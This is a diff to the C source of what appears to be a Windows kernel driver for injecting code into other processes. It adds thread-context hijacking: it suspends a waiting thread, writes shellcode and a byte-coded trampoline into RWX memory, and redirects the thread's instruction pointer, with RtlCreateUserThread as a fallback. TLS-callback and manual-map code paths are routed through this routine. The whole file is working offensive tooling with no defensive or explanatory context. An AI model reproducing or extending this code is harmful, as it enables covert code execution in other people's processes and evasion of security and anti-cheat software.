@@ -13,6 +13,10 @@ fn_MmCopyVirtualMemory     pfnMmCopyVirtualMemory    = NULL;
 fn_PsGetProcessPeb         pfnPsGetProcessPeb        = NULL;
 fn_ZwProtectVirtualMemory  pfnZwProtectVirtualMemory = NULL;
 fn_RtlCreateUserThread     pfnRtlCreateUserThread    = NULL;
+fn_ZwSuspendThread         pfnZwSuspendThread        = NULL;
+fn_ZwResumeThread          pfnZwResumeThread         = NULL;
+fn_ZwGetThreadContext      pfnZwGetThreadContext     = NULL;
+fn_ZwSetThreadContext      pfnZwSetThreadContext     = NULL;
 
 NTSTATUS ResolveDynamicImports(VOID)
 {
@@ -29,6 +33,18 @@ NTSTATUS ResolveDynamicImports(VOID)
 
     RtlInitUnicodeString(&name, L"RtlCreateUserThread");
     pfnRtlCreateUserThread = (fn_RtlCreateUserThread)MmGetSystemRoutineAddress(&name);
+
+    RtlInitUnicodeString(&name, L"ZwSuspendThread");
+    pfnZwSuspendThread = (fn_ZwSuspendThread)MmGetSystemRoutineAddress(&name);
+
+    RtlInitUnicodeString(&name, L"ZwResumeThread");
+    pfnZwResumeThread = (fn_ZwResumeThread)MmGetSystemRoutineAddress(&name);
+
+    RtlInitUnicodeString(&name, L"ZwGetThreadContext");
+    pfnZwGetThreadContext = (fn_ZwGetThreadContext)MmGetSystemRoutineAddress(&name);
+
+    RtlInitUnicodeString(&name, L"ZwSetThreadContext");
+    pfnZwSetThreadContext = (fn_ZwSetThreadContext)MmGetSystemRoutineAddress(&name);
 
     if (!pfnMmCopyVirtualMemory || !pfnPsGetProcessPeb) {
         DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL,
@@ -55,7 +71,7 @@ NTSTATUS CreateSharedMemory(VOID)
 {
 
     g_SharedBuffer = ExAllocatePool2(
-        POOL_FLAG_NON_PAGED | POOL_FLAG_ZERO_ALLOCATION,
+        POOL_FLAG_NON_PAGED,
         SHM_TOTAL_SIZE, DRV_POOL_TAG
     );
     if (!g_SharedBuffer) return STATUS_INSUFFICIENT_RESOURCES;
@@ -131,7 +147,7 @@ static VOID ProcessNotifyCallback(
 
     if (!CreateInfo->ImageFileName || !g_SharedMdl) return;
 
-    UNICODE_STRING* full = CreateInfo->ImageFileName;
+    PCUNICODE_STRING full = CreateInfo->ImageFileName;
     USHORT          slash = 0;
     for (USHORT i = 0; i < full->Length / sizeof(WCHAR); i++)
         if (full->Buffer[i] == L'\\') slash = (USHORT)(i + 1);
@@ -732,36 +748,138 @@ static NTSTATUS FindSuitableThread(_In_ ULONG TargetPid, _Out_ PHANDLE OutHandle
         return status;
     }
 
-    HANDLE target = (HANDLE)(ULONG_PTR)TargetPid;
+    HANDLE target    = (HANDLE)(ULONG_PTR)TargetPid;
+    HANDLE hFallback = NULL;
     SYS_PROC_INFO* entry = (SYS_PROC_INFO*)buf;
 
     for (;;) {
         if (entry->UniqueProcessId == target && entry->NumberOfThreads > 1) {
+
             for (ULONG i = 1; i < entry->NumberOfThreads; i++) {
                 SYS_THREAD_INFO* ti = &entry->Threads[i];
 
+                OBJECT_ATTRIBUTES oa;
+                InitializeObjectAttributes(&oa, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
+                HANDLE hThr = NULL;
+                NTSTATUS os = ZwOpenThread(&hThr,
+                    THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT |
+                    THREAD_QUERY_INFORMATION,
+                    &oa, &ti->ClientId);
+
+                if (!NT_SUCCESS(os))
+                    continue;
+
                 if (ti->ThreadState == 5 && ti->WaitReason == 6) {
-                    OBJECT_ATTRIBUTES oa;
-                    InitializeObjectAttributes(&oa, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
-                    HANDLE hThr = NULL;
-                    NTSTATUS os = ZwOpenThread(&hThr,
-                        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT |
-                        THREAD_QUERY_INFORMATION,
-                        &oa, &ti->ClientId);
-                    if (NT_SUCCESS(os)) {
-                        *OutHandle = hThr;
-                        ExFreePoolWithTag(buf, DRV_POOL_TAG);
-                        return STATUS_SUCCESS;
-                    }
+                    if (hFallback) ZwClose(hFallback);
+                    ExFreePoolWithTag(buf, DRV_POOL_TAG);
+                    *OutHandle = hThr;
+                    return STATUS_SUCCESS;
+                }
+
+                if (ti->ThreadState == 5 && !hFallback) {
+                    hFallback = hThr;
+                } else {
+                    ZwClose(hThr);
                 }
             }
+            break;
         }
         if (!entry->NextEntryOffset) break;
-        entry = (SYS_PROC_INFO*)((BYTE*)entry + entry->NextEntryOffset);
+        entry = (SYS_PROC_INFO*)((UCHAR*)entry + entry->NextEntryOffset);
     }
 
     ExFreePoolWithTag(buf, DRV_POOL_TAG);
+
+    if (hFallback) {
+        *OutHandle = hFallback;
+        return STATUS_SUCCESS;
+    }
+
     return STATUS_NOT_FOUND;
+}
+
+static NTSTATUS RunShellcodeInTarget(
+    _In_ PEPROCESS Process,
+    _In_ ULONG     TargetPid,
+    _In_ HANDLE    ProcHandle,
+    _In_ PVOID     Sc,
+    _In_ SIZE_T    ScSize)
+{
+    if (ScSize > 0xF00) return STATUS_INVALID_PARAMETER;
+
+    SIZE_T totalSize = 0x2000;
+    PVOID  allocBase = NULL;
+    NTSTATUS status = ZwAllocateVirtualMemory(ProcHandle, &allocBase, 0, &totalSize,
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!NT_SUCCESS(status)) return status;
+
+    ULONG_PTR scVA        = (ULONG_PTR)allocBase;
+    ULONG_PTR trampolineVA = scVA + 0x1000;
+    ULONG_PTR stackVA      = scVA + 0x1100;
+    ULONG_PTR flagVA       = scVA + 0x1FF0;
+
+    WriteToProcess(Process, (PVOID)scVA, Sc, ScSize);
+
+    BOOLEAN executed = FALSE;
+    HANDLE  hThread  = NULL;
+
+    if (NT_SUCCESS(FindSuitableThread(TargetPid, &hThread))) {
+        if (pfnZwSuspendThread) pfnZwSuspendThread(hThread, NULL);
+        CONTEXT ctx = {};
+        ctx.ContextFlags = CONTEXT_FULL;
+        if (pfnZwGetThreadContext && NT_SUCCESS(pfnZwGetThreadContext(hThread, &ctx))) {
+            static const UCHAR kCallTpl[] = {
+                0x48, 0x83, 0xEC, 0x28,
+                0x48, 0xB8, 0,0,0,0, 0,0,0,0,
+                0xFF, 0xD0,
+                0x48, 0xB8, 0,0,0,0, 0,0,0,0,
+                0xC7, 0x00, 0x01, 0x00, 0x00, 0x00,
+                0x48, 0x83, 0xC4, 0x28,
+                0x48, 0xB8, 0,0,0,0, 0,0,0,0,
+                0xFF, 0xE0
+            };
+            UCHAR tpl[sizeof(kCallTpl)];
+            RtlCopyMemory(tpl, kCallTpl, sizeof(tpl));
+            *(ULONG_PTR*)(tpl + 6)  = scVA;
+            *(ULONG_PTR*)(tpl + 18) = flagVA;
+            *(ULONG_PTR*)(tpl + 38) = ctx.Rip;
+            WriteToProcess(Process, (PVOID)trampolineVA, tpl, sizeof(tpl));
+
+            CONTEXT newCtx     = ctx;
+            newCtx.Rip         = trampolineVA;
+            newCtx.Rsp         = stackVA + 0xF8;
+
+            if (pfnZwSetThreadContext && NT_SUCCESS(pfnZwSetThreadContext(hThread, &newCtx))) {
+                if (pfnZwResumeThread) pfnZwResumeThread(hThread, NULL);
+                for (int i = 0; i < 500; i++) {
+                    ULONG done = 0;
+                    ReadFromProcess(Process, (PVOID)flagVA, &done, sizeof(done));
+                    if (done) { executed = TRUE; break; }
+                    LARGE_INTEGER d; d.QuadPart = -100000LL;
+                    KeDelayExecutionThread(KernelMode, FALSE, &d);
+                }
+            } else {
+                if (pfnZwResumeThread) pfnZwResumeThread(hThread, NULL);
+            }
+        } else {
+            if (pfnZwResumeThread) pfnZwResumeThread(hThread, NULL);
+        }
+        ZwClose(hThread);
+    }
+
+    if (!executed && pfnRtlCreateUserThread) {
+        HANDLE thr = NULL;
+        if (NT_SUCCESS(pfnRtlCreateUserThread(ProcHandle, NULL, FALSE, 0, 0, 0,
+                                               (PVOID)scVA, NULL, &thr, NULL))) {
+            LARGE_INTEGER timeout; timeout.QuadPart = -30000000LL;
+            ZwWaitForSingleObject(thr, FALSE, &timeout);
+            ZwClose(thr);
+            executed = TRUE;
+        }
+    }
+
+    ZwFreeVirtualMemory(ProcHandle, &allocBase, &totalSize, MEM_RELEASE);
+    return executed ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
 }
 
 static const UCHAR kHijackTemplate[] = {
@@ -790,13 +908,13 @@ static NTSTATUS ExecuteViaHijack(
     if (!NT_SUCCESS(FindSuitableThread(TargetPid, &hThread)))
         return STATUS_NOT_FOUND;
 
-    ZwSuspendThread(hThread, NULL);
+    if (pfnZwSuspendThread) pfnZwSuspendThread(hThread, NULL);
 
     CONTEXT ctx = {};
     ctx.ContextFlags = CONTEXT_FULL;
-    NTSTATUS status = ZwGetThreadContext(hThread, &ctx);
+    NTSTATUS status = pfnZwGetThreadContext ? pfnZwGetThreadContext(hThread, &ctx) : STATUS_PROCEDURE_NOT_FOUND;
     if (!NT_SUCCESS(status)) {
-        ZwResumeThread(hThread, NULL);
+        if (pfnZwResumeThread) pfnZwResumeThread(hThread, NULL);
         ZwClose(hThread);
         return status;
     }
@@ -806,7 +924,7 @@ static NTSTATUS ExecuteViaHijack(
     status = ZwAllocateVirtualMemory(ProcHandle, &mem, 0, &memSz,
         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!NT_SUCCESS(status)) {
-        ZwResumeThread(hThread, NULL);
+        if (pfnZwResumeThread) pfnZwResumeThread(hThread, NULL);
         ZwClose(hThread);
         return status;
     }
@@ -828,15 +946,15 @@ static NTSTATUS ExecuteViaHijack(
     newCtx.Rip = scBase;
     newCtx.Rsp = stackBase + 0xFF8;
 
-    status = ZwSetThreadContext(hThread, &newCtx);
+    status = pfnZwSetThreadContext ? pfnZwSetThreadContext(hThread, &newCtx) : STATUS_PROCEDURE_NOT_FOUND;
     if (!NT_SUCCESS(status)) {
         ZwFreeVirtualMemory(ProcHandle, &mem, &memSz, MEM_RELEASE);
-        ZwResumeThread(hThread, NULL);
+        if (pfnZwResumeThread) pfnZwResumeThread(hThread, NULL);
         ZwClose(hThread);
         return status;
     }
 
-    ZwResumeThread(hThread, NULL);
+    if (pfnZwResumeThread) pfnZwResumeThread(hThread, NULL);
     ZwClose(hThread);
 
     ULONG done = 0;
@@ -994,11 +1112,13 @@ NTSTATUS ExecuteTlsCallbacks(
         sizeof(callbacks)
     );
 
+    ULONG pid = (ULONG)(ULONG_PTR)PsGetProcessId(Process);
+
     for (int i = 0; i < 64 && callbacks[i]; i++) {
         ULONG_PTR cbVa = callbacks[i];
 
-        UCHAR sc[40];
-        RtlCopyMemory(sc, g_ShellcodeTemplate, sizeof(sc) < SHELLCODE_SIZE ? sizeof(sc) : SHELLCODE_SIZE);
+        UCHAR sc[SHELLCODE_SIZE];
+        RtlCopyMemory(sc, g_ShellcodeTemplate, SHELLCODE_SIZE);
         *(ULONG_PTR*)(sc + SHELLCODE_HMODULE_OFFSET) = (ULONG_PTR)AllocBase;
         *(ULONG_PTR*)(sc + SHELLCODE_ENTRY_OFFSET)   = cbVa;
 
@@ -1011,24 +1131,7 @@ NTSTATUS ExecuteTlsCallbacks(
         if (!NT_SUCCESS(ZwOpenProcess(&procHandle, PROCESS_ALL_ACCESS, &oa, &cid)))
             continue;
 
-        PVOID scBase = NULL;
-        SIZE_T scSize = SHELLCODE_SIZE;
-        if (NT_SUCCESS(ZwAllocateVirtualMemory(procHandle, &scBase, 0, &scSize,
-                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
-            WriteToProcess(Process, scBase, sc, SHELLCODE_SIZE);
-
-            if (pfnRtlCreateUserThread) {
-                HANDLE thr = NULL;
-                if (NT_SUCCESS(pfnRtlCreateUserThread(procHandle, NULL, FALSE, 0, 0, 0,
-                                                       scBase, NULL, &thr, NULL))) {
-                    LARGE_INTEGER timeout;
-                    timeout.QuadPart = -30000000LL;
-                    ZwWaitForSingleObject(thr, FALSE, &timeout);
-                    ZwClose(thr);
-                }
-            }
-            ZwFreeVirtualMemory(procHandle, &scBase, &scSize, MEM_RELEASE);
-        }
+        RunShellcodeInTarget(Process, pid, procHandle, sc, SHELLCODE_SIZE);
         ZwClose(procHandle);
 
         DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL,
@@ -1255,7 +1358,7 @@ NTSTATUS PerformManualMap(
 
             if (fnRaft) {
                 ULONG_PTR pdataVa   = (ULONG_PTR)allocBase + pdataRva;
-                ULONG     entryCount = pdataSize / sizeof(RUNTIME_FUNCTION);
+                ULONG     entryCount = pdataSize / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY);
 
                 UCHAR sc[sizeof(kRaftTemplate)];
                 RtlCopyMemory(sc, kRaftTemplate, sizeof(sc));
@@ -1264,28 +1367,13 @@ NTSTATUS PerformManualMap(
                 *(ULONG_PTR*)(sc + OFF_BASE)   = (ULONG_PTR)allocBase;
                 *(ULONG_PTR*)(sc + OFF_FN)     = (ULONG_PTR)fnRaft;
 
-                PVOID  scBase = NULL;
-                SIZE_T scSize = sizeof(sc);
                 CLIENT_ID cid = { (HANDLE)(ULONG_PTR)TargetPid, NULL };
                 OBJECT_ATTRIBUTES oa;
                 InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
                 HANDLE ph = NULL;
 
                 if (NT_SUCCESS(ZwOpenProcess(&ph, PROCESS_ALL_ACCESS, &oa, &cid))) {
-                    if (NT_SUCCESS(ZwAllocateVirtualMemory(ph, &scBase, 0, &scSize,
-                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
-                        WriteToProcess(process, scBase, sc, sizeof(sc));
-                        if (pfnRtlCreateUserThread) {
-                            HANDLE thr = NULL;
-                            if (NT_SUCCESS(pfnRtlCreateUserThread(ph, NULL, FALSE, 0, 0, 0,
-                                                                   scBase, NULL, &thr, NULL))) {
-                                LARGE_INTEGER t; t.QuadPart = -30000000LL;
-                                ZwWaitForSingleObject(thr, FALSE, &t);
-                                ZwClose(thr);
-                            }
-                        }
-                        ZwFreeVirtualMemory(ph, &scBase, &scSize, MEM_RELEASE);
-                    }
+                    RunShellcodeInTarget(process, TargetPid, ph, sc, sizeof(sc));
                     ZwClose(ph);
                 }
                 DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_INFO_LEVEL,
